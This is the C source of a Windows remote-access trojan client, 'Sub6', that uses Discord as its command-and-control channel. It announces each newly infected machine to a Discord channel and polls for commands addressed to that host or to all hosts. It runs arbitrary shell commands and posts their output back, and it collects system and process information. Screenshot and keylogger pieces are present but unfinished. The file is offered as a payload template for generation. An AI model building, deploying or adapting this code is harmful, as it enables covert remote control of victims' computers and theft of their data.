// Sub6 Discord C2 Client - Windows
// Uses Discord REST API for C2 communication

#include <winsock2.h>
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <ws2tcpip.h>
#include <direct.h>
#include <shlobj.h>
#include <vfw.h>
#include <mmsystem.h>
#include <intrin.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib, "winmm.lib")

#define BUFFER_SIZE 262144
#define RECONNECT_DELAY 5000
#define POLL_INTERVAL 3000
#define MAX_MESSAGE_LENGTH 1900  // Discord limit is 2000

// Discord Configuration - Will be replaced during payload generation
#define DISCORD_TOKEN "YOUR_BOT_TOKEN_HERE"
#define DISCORD_CHANNEL_ID "YOUR_CHANNEL_ID_HERE"

// Global variables
static char g_computer_name[256] = "";
static char g_user_name[256] = "";
static char g_client_id[64] = "";
static char g_current_dir[MAX_PATH] = "";
static char g_last_message_id[64] = "";  // Track last processed message
static volatile int g_running = 1;

// Forward declarations
void send_discord_message(const char* content);
char* get_discord_messages(void);
void handle_command(const char* cmd);
void send_sysinfo(void);
void run_shell_command(const char* cmd);
void take_screenshot(void);
void list_processes(void);
const char* get_key_name(int vk);

// ==========================================================================
// Discord API Communication
// ==========================================================================

void send_discord_message(const char* content) {
    if (!content || strlen(content) == 0) return;
    
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (!hSession) return;
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", 
        INTERNET_DEFAULT_HTTPS_PORT, 0);
    
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return;
    }
    
    // Build path: /api/v10/channels/{channel_id}/messages
    wchar_t path[512];
    swprintf(path, 512, L"/api/v10/channels/%hs/messages", DISCORD_CHANNEL_ID);
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path, 
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 
        WINHTTP_FLAG_SECURE);
    
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }
    
    // Build authorization header
    wchar_t authHeader[512];
    swprintf(authHeader, 512, L"Authorization: Bot %hs", DISCORD_TOKEN);
    WinHttpAddRequestHeaders(hRequest, authHeader, -1, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/json", -1, WINHTTP_ADDREQ_FLAG_ADD);
    
    // Split long messages
    const char* ptr = content;
    int remaining = strlen(content);
    
    while (remaining > 0) {
        int chunk_len = remaining > MAX_MESSAGE_LENGTH ? MAX_MESSAGE_LENGTH : remaining;
        
        // Find a good break point (newline) if splitting
        if (chunk_len < remaining) {
            for (int i = chunk_len - 1; i > chunk_len - 200 && i > 0; i--) {
                if (ptr[i] == '\n') {
                    chunk_len = i + 1;
                    break;
                }
            }
        }
        
        // Build JSON payload with escaped content
        char* json = (char*)malloc(chunk_len * 6 + 256);  // Extra space for escaping
        if (!json) break;
        
        char* escaped = (char*)malloc(chunk_len * 6 + 1);
        if (!escaped) {
            free(json);
            break;
        }
        
        // Escape JSON special characters
        int j = 0;
        for (int i = 0; i < chunk_len && ptr[i]; i++) {
            switch(ptr[i]) {
                case '"': escaped[j++] = '\\'; escaped[j++] = '"'; break;
                case '\\': escaped[j++] = '\\'; escaped[j++] = '\\'; break;
                case '\n': escaped[j++] = '\\'; escaped[j++] = 'n'; break;
                case '\r': escaped[j++] = '\\'; escaped[j++] = 'r'; break;
                case '\t': escaped[j++] = '\\'; escaped[j++] = 't'; break;
                default: escaped[j++] = ptr[i]; break;
            }
        }
        escaped[j] = '\0';
        
        // Prefix with computer name for identification
        sprintf(json, "{\"content\":\"**[%s\\\\%s]**\\n```\\n%s\\n```\"}", 
            g_computer_name, g_user_name, escaped);
        
        // Send request
        WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
            json, strlen(json), strlen(json), 0);
        WinHttpReceiveResponse(hRequest, NULL);
        
        free(escaped);
        free(json);
        
        ptr += chunk_len;
        remaining -= chunk_len;
        
        // Small delay between chunks to avoid rate limiting
        if (remaining > 0) Sleep(500);
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

char* get_discord_messages(void) {
    static char buffer[65536];
    memset(buffer, 0, sizeof(buffer));
    
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (!hSession) return NULL;
    
    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", 
        INTERNET_DEFAULT_HTTPS_PORT, 0);
    
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return NULL;
    }
    
    // Build path with after parameter to get new messages only
    wchar_t path[512];
    if (g_last_message_id[0]) {
        swprintf(path, 512, L"/api/v10/channels/%hs/messages?after=%hs&limit=10", 
            DISCORD_CHANNEL_ID, g_last_message_id);
    } else {
        swprintf(path, 512, L"/api/v10/channels/%hs/messages?limit=5", DISCORD_CHANNEL_ID);
    }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, 
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 
        WINHTTP_FLAG_SECURE);
    
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }
    
    // Build authorization header
    wchar_t authHeader[512];
    swprintf(authHeader, 512, L"Authorization: Bot %hs", DISCORD_TOKEN);
    WinHttpAddRequestHeaders(hRequest, authHeader, -1, WINHTTP_ADDREQ_FLAG_ADD);
    
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }
    
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return NULL;
    }
    
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    int offset = 0;
    
    do {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
        if (dwSize == 0) break;
        if (offset + dwSize >= sizeof(buffer) - 1) break;
        
        if (WinHttpReadData(hRequest, buffer + offset, dwSize, &dwDownloaded)) {
            offset += dwDownloaded;
        }
    } while (dwSize > 0);
    
    buffer[offset] = '\0';
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return buffer[0] ? buffer : NULL;
}

// Parse messages and extract commands for this client
void process_discord_messages(const char* json_response) {
    if (!json_response || strlen(json_response) < 10) return;
    
    // Simple JSON parsing - look for messages with our target prefix
    // Command format: !sub6 COMPUTERNAME command
    // or: !COMPUTERNAME command
    
    char target_prefix[300];
    sprintf(target_prefix, "!%s ", g_computer_name);
    
    char target_prefix2[300];
    sprintf(target_prefix2, "!sub6 %s ", g_computer_name);
    
    // Find message IDs and content
    const char* ptr = json_response;
    char newest_id[64] = "";
    
    while ((ptr = strstr(ptr, "\"id\":\"")) != NULL) {
        ptr += 6;
        char msg_id[64] = "";
        int i = 0;
        while (*ptr && *ptr != '"' && i < 63) {
            msg_id[i++] = *ptr++;
        }
        msg_id[i] = '\0';
        
        // Track newest message ID
        if (strlen(msg_id) > 0 && strcmp(msg_id, newest_id) > 0) {
            strcpy(newest_id, msg_id);
        }
        
        // Find content for this message
        const char* content_ptr = strstr(ptr, "\"content\":\"");
        if (content_ptr) {
            content_ptr += 11;
            char content[4096] = "";
            int j = 0;
            while (*content_ptr && *content_ptr != '"' && j < 4095) {
                if (*content_ptr == '\\' && *(content_ptr + 1)) {
                    content_ptr++;
                    switch(*content_ptr) {
                        case 'n': content[j++] = '\n'; break;
                        case 'r': content[j++] = '\r'; break;
                        case 't': content[j++] = '\t'; break;
                        case '"': content[j++] = '"'; break;
                        case '\\': content[j++] = '\\'; break;
                        default: content[j++] = *content_ptr; break;
                    }
                } else {
                    content[j++] = *content_ptr;
                }
                content_ptr++;
            }
            content[j] = '\0';
            
            // Check if this is a command for us
            char* cmd = NULL;
            if (strncmp(content, target_prefix, strlen(target_prefix)) == 0) {
                cmd = content + strlen(target_prefix);
            } else if (strncmp(content, target_prefix2, strlen(target_prefix2)) == 0) {
                cmd = content + strlen(target_prefix2);
            } else if (strncmp(content, "!all ", 5) == 0) {
                cmd = content + 5;  // Broadcast command to all clients
            }
            
            if (cmd && strlen(cmd) > 0) {
                // Trim whitespace
                while (*cmd == ' ' || *cmd == '\t') cmd++;
                char* end = cmd + strlen(cmd) - 1;
                while (end > cmd && (*end == ' ' || *end == '\t' || *end == '\n' || *end == '\r')) {
                    *end-- = '\0';
                }
                
                if (strlen(cmd) > 0) {
                    handle_command(cmd);
                }
            }
        }
    }
    
    // Update last message ID
    if (strlen(newest_id) > 0) {
        strcpy(g_last_message_id, newest_id);
    }
}

// ==========================================================================
// Command Handlers
// ==========================================================================

void handle_command(const char* cmd) {
    if (!cmd || strlen(cmd) == 0) return;
    
    char response[BUFFER_SIZE] = "";
    
    if (strcmp(cmd, "sysinfo") == 0) {
        send_sysinfo();
    }
    else if (strcmp(cmd, "screenshot") == 0) {
        take_screenshot();
    }
    else if (strcmp(cmd, "ps") == 0) {
        list_processes();
    }
    else if (strcmp(cmd, "pwd") == 0) {
        GetCurrentDirectoryA(MAX_PATH, g_current_dir);
        sprintf(response, "Current directory: %s", g_current_dir);
        send_discord_message(response);
    }
    else if (strncmp(cmd, "cd ", 3) == 0) {
        if (SetCurrentDirectoryA(cmd + 3)) {
            GetCurrentDirectoryA(MAX_PATH, g_current_dir);
            sprintf(response, "[+] Changed to: %s", g_current_dir);
        } else {
            sprintf(response, "[!] Failed to change directory");
        }
        send_discord_message(response);
    }
    else if (strncmp(cmd, "shell ", 6) == 0 || strncmp(cmd, "exec ", 5) == 0) {
        const char* shell_cmd = (strncmp(cmd, "shell ", 6) == 0) ? cmd + 6 : cmd + 5;
        run_shell_command(shell_cmd);
    }
    else if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "kill") == 0) {
        send_discord_message("[!] Client exiting...");
        g_running = 0;
    }
    else if (strcmp(cmd, "ping") == 0) {
        send_discord_message("[+] Pong!");
    }
    else if (strcmp(cmd, "help") == 0) {
        sprintf(response, 
            "Available Commands:\n"
            "  sysinfo     - Get system information\n"
            "  screenshot  - Take screenshot (base64)\n"
            "  ps          - List processes\n"
            "  pwd         - Print working directory\n"
            "  cd <path>   - Change directory\n"
            "  shell <cmd> - Execute shell command\n"
            "  exec <cmd>  - Execute shell command\n"
            "  ping        - Check if client is alive\n"
            "  exit/kill   - Terminate client\n"
            "\nCommand format: !%s <command> or !all <command>",
            g_computer_name);
        send_discord_message(response);
    }
    else {
        // Try as shell command
        run_shell_command(cmd);
    }
}

void send_sysinfo(void) {
    char buffer[4096] = "";
    char temp[512];
    
    // Computer name
    sprintf(temp, "Computer: %s\n", g_computer_name);
    strcat(buffer, temp);
    
    // Username
    sprintf(temp, "User: %s\n", g_user_name);
    strcat(buffer, temp);
    
    // OS Version
    OSVERSIONINFOEXA osvi;
    ZeroMemory(&osvi, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    
    typedef NTSTATUS(WINAPI *RtlGetVersionFunc)(OSVERSIONINFOEXA*);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        RtlGetVersionFunc RtlGetVersion = (RtlGetVersionFunc)GetProcAddress(hNtdll, "RtlGetVersion");
        if (RtlGetVersion) {
            RtlGetVersion(&osvi);
            sprintf(temp, "OS: Windows %lu.%lu Build %lu\n", 
                osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
            strcat(buffer, temp);
        }
    }
    
    // CPU Info
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    sprintf(temp, "Processors: %lu\n", si.dwNumberOfProcessors);
    strcat(buffer, temp);
    
    // RAM
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    sprintf(temp, "RAM: %llu MB total, %llu MB free\n", 
        mem.ullTotalPhys / (1024*1024), mem.ullAvailPhys / (1024*1024));
    strcat(buffer, temp);
    
    // Screen
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    sprintf(temp, "Screen: %dx%d\n", w, h);
    strcat(buffer, temp);
    
    // Current directory
    GetCurrentDirectoryA(MAX_PATH, g_current_dir);
    sprintf(temp, "Directory: %s", g_current_dir);
    strcat(buffer, temp);
    
    send_discord_message(buffer);
}

void run_shell_command(const char* cmd) {
    char output[BUFFER_SIZE] = "";
    char full_cmd[1024];
    
    sprintf(full_cmd, "cmd /c %s 2>&1", cmd);
    
    FILE* pipe = _popen(full_cmd, "r");
    if (pipe) {
        int offset = 0;
        char line[1024];
        while (fgets(line, sizeof(line), pipe) && offset < BUFFER_SIZE - 1024) {
            int len = strlen(line);
            if (offset + len < BUFFER_SIZE - 1) {
                strcpy(output + offset, line);
                offset += len;
            }
        }
        _pclose(pipe);
        
        if (strlen(output) > 0) {
            send_discord_message(output);
        } else {
            send_discord_message("[*] Command executed (no output)");
        }
    } else {
        send_discord_message("[!] Failed to execute command");
    }
}

void list_processes(void) {
    char buffer[BUFFER_SIZE] = "";
    int offset = 0;
    
    offset += sprintf(buffer + offset, "%-8s %-40s %s\n", "PID", "NAME", "PATH");
    offset += sprintf(buffer + offset, "%-8s %-40s %s\n", "---", "----", "----");
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        
        if (Process32First(hSnapshot, &pe)) {
            do {
                char path[MAX_PATH] = "";
                HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
                if (hProc) {
                    DWORD size = MAX_PATH;
                    QueryFullProcessImageNameA(hProc, 0, path, &size);
                    CloseHandle(hProc);
                }
                
                if (offset < BUFFER_SIZE - 512) {
                    offset += sprintf(buffer + offset, "%-8lu %-40s %s\n", 
                        pe.th32ProcessID, pe.szExeFile, path[0] ? path : "N/A");
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    
    send_discord_message(buffer);
}

void take_screenshot(void) {
    // Take screenshot and send as base64
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    // Note: Full implementation would save to BMP/PNG and base64 encode
    // For Discord, we'd typically upload as a file attachment
    // This simplified version just confirms the screenshot was taken
    
    send_discord_message("[+] Screenshot captured (upload not implemented in basic client)");
    
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

// ==========================================================================
// Keylogger (simplified)
// ==========================================================================

static char g_keylog_path[MAX_PATH] = "";
static volatile int g_keylog_running = 0;
static HANDLE g_keylog_thread = NULL;

const char* get_key_name(int vk) {
    static char buf[16];
    switch(vk) {
        case VK_RETURN: return "[ENTER]";
        case VK_SPACE: return " ";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_ESCAPE: return "[ESC]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: return "[SHIFT]";
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "[CTRL]";
        case VK_MENU: case VK_LMENU: case VK_RMENU: return "[ALT]";
        default: break;
    }
    
    BYTE keyState[256];
    GetKeyboardState(keyState);
    
    WCHAR wc[4] = {0};
    int result = ToUnicode(vk, MapVirtualKey(vk, 0), keyState, wc, 4, 0);
    
    if (result > 0) {
        WideCharToMultiByte(CP_UTF8, 0, wc, result, buf, sizeof(buf) - 1, NULL, NULL);
        buf[result] = '\0';
        return buf;
    }
    
    return "";
}

// ==========================================================================
// Main Entry Point
// ==========================================================================

void generate_client_id(void) {
    // Generate unique client ID from hardware info
    DWORD serial = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
    sprintf(g_client_id, "%s-%08lX", g_computer_name, serial);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    // Get system info
    DWORD size = sizeof(g_computer_name);
    GetComputerNameA(g_computer_name, &size);
    size = sizeof(g_user_name);
    GetUserNameA(g_user_name, &size);
    GetCurrentDirectoryA(MAX_PATH, g_current_dir);
    generate_client_id();
    
    // Send initial connection message
    char connect_msg[1024];
    sprintf(connect_msg, 
        "[+] **New Client Connected**\n"
        "Computer: %s\n"
        "User: %s\n"
        "ClientID: %s\n"
        "Commands: !%s <cmd> or !all <cmd>",
        g_computer_name, g_user_name, g_client_id, g_computer_name);
    
    send_discord_message(connect_msg);
    
    // Main loop - poll for commands
    while (g_running) {
        char* messages = get_discord_messages();
        if (messages) {
            process_discord_messages(messages);
        }
        
        Sleep(POLL_INTERVAL);
    }
    
    return 0;
}
